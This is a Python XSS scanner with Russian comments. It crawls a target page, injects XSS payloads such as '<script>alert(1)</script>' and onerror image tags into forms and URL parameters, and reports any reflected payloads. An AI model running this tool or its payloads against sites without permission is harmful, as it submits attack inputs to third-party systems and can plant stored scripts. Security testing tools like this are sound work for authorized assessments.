import os
import re
import requests
from urllib.parse import urljoin, urlparse, quote
import logging
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from bs4 import BeautifulSoup

# Настройка логирования
logging.basicConfig(filename='xss_test_results.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

class XSSDetector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)'
        })
        
    def scan_page(self):
        """Основная функция сканирования страницы"""
        print(f"\n[+] Начинаем сканирование: {self.target_url}")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            response.raise_for_status()
            
            # Анализируем HTML страницы
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Ищем все формы (потенциальные Stored XSS)
            forms = soup.find_all('form')
            print(f"\n[+] Найдено {len(forms)} форм на странице")
            
            # Ищем все ссылки и параметры URL (потенциальные Reflected XSS)
            links = soup.find_all('a', href=True)
            scripts = soup.find_all('script', src=True)
            
            # Собираем уникальные URL параметры
            url_params = self._extract_url_params(response.url, links, scripts)
            print(f"[+] Найдено {len(url_params)} уникальных URL параметров")
            
            return forms, url_params
            
        except requests.exceptions.RequestException as e:
            logging.error(f"Ошибка при сканировании страницы: {e}")
            print(f"[-] Ошибка: {e}")
            return [], []
    
    def _extract_url_params(self, base_url, links, scripts):
        """Извлекает параметры URL из всех ссылок страницы"""
        params = set()
        
        # Проверяем основной URL
        params.update(self._get_params_from_url(base_url))
        
        # Проверяем все ссылки
        for link in links:
            full_url = urljoin(base_url, link['href'])
            params.update(self._get_params_from_url(full_url))
        
        # Проверяем все скрипты
        for script in scripts:
            full_url = urljoin(base_url, script['src'])
            params.update(self._get_params_from_url(full_url))
            
        return params
    
    def _get_params_from_url(self, url):
        """Извлекает параметры из URL"""
        params = set()
        try:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        params.add(param.split('=')[0])
        except:
            pass
        return params
    
    def find_input_fields(self, form):
        """Находит все поля ввода в форме"""
        inputs = form.find_all(['input', 'textarea', 'select'])
        fields = []
        
        for input_field in inputs:
            if input_field.get('type') in ['hidden', 'submit']:
                continue
                
            name = input_field.get('name') or input_field.get('id')
            if name:
                fields.append({
                    'name': name,
                    'type': input_field.name,
                    'value': input_field.get('value', '')
                })
                
        return fields

class XSSTester:
    def __init__(self):
        self.payloads = self._load_payloads()
        
    def _load_payloads(self):
        """Загружает XSS payloads из файла"""
        try:
            with open('payloads/xss_payloads.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [
                '<script>alert(1)</script>',
                '" onmouseover=alert(1)',
                "'><img src=x onerror=alert(1)>",
                'javascript:alert(1)'
            ]
    
    def test_stored_xss(self, url, form, fields, timeout=10):
        """Тестирование Stored XSS в формах"""
        vulnerabilities = []
        form_action = form.get('action') or url
        
        for payload in self.payloads:
            try:
                data = {}
                for field in fields:
                    data[field['name']] = payload if field['type'] != 'hidden' else field['value']
                
                response = requests.post(urljoin(url, form_action), data=data, timeout=timeout)
                
                if payload in response.text:
                    vulnerabilities.append({
                        'form': form_action,
                        'field': field['name'],
                        'payload': payload
                    })
                    
            except Exception as e:
                logging.error(f"Ошибка при тестировании формы: {e}")
                
        return vulnerabilities
    
    def test_reflected_xss(self, url, param, timeout=10):
        """Тестирование Reflected XSS в URL параметрах"""
        vulnerabilities = []
        
        for payload in self.payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=timeout)
                
                if payload in response.text:
                    vulnerabilities.append({
                        'param': param,
                        'payload': payload,
                        'url': test_url
                    })
                    
            except Exception as e:
                logging.error(f"Ошибка при тестировании параметра: {e}")
                
        return vulnerabilities

def print_vulnerabilities(vuln_type, vulnerabilities):
    """Выводит найденные уязвимости"""
    print(f"\n=== {vuln_type} XSS Уязвимости ===")
    
    if not vulnerabilities:
        print("Не найдено")
        return
        
    for i, vuln in enumerate(vulnerabilities, 1):
        if vuln_type == "Stored":
            print(f"{i}. Форма: {vuln['form']}")
            print(f"   Поле: {vuln['field']}")
            print(f"   Payload: {vuln['payload']}\n")
        else:
            print(f"{i}. Параметр: {vuln['param']}")
            print(f"   URL: {vuln['url']}\n")

def main():
    print("=== Улучшенный XSS Scanner ===")
    
    # Получаем URL для сканирования
    target_url = input("Введите URL для сканирования: ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Сканируем страницу
    detector = XSSDetector(target_url)
    forms, url_params = detector.scan_page()
    
    if not forms and not url_params:
        print("[-] Не найдено элементов для тестирования")
        return
    
    # Запускаем тестирование
    tester = XSSTester()
    stored_vulns = []
    reflected_vulns = []
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        # Тестируем формы (Stored XSS)
        if forms:
            print("\n[+] Тестируем формы на Stored XSS...")
            for form in tqdm(forms, desc="Forms"):
                fields = detector.find_input_fields(form)
                if fields:
                    vulns = tester.test_stored_xss(target_url, form, fields)
                    stored_vulns.extend(vulns)
        
        # Тестируем параметры URL (Reflected XSS)
        if url_params:
            print("\n[+] Тестируем параметры URL на Reflected XSS...")
            for param in tqdm(url_params, desc="URL Params"):
                vulns = tester.test_reflected_xss(target_url, param)
                reflected_vulns.extend(vulns)
    
    # Выводим результаты
    print_vulnerabilities("Stored", stored_vulns)
    print_vulnerabilities("Reflected", reflected_vulns)
    
    # Сохраняем результаты в лог
    logging.info(f"Stored XSS vulnerabilities found: {len(stored_vulns)}")
    logging.info(f"Reflected XSS vulnerabilities found: {len(reflected_vulns)}")
    
    print("\n[+] Сканирование завершено!")

if __name__ == "__main__":
    main()
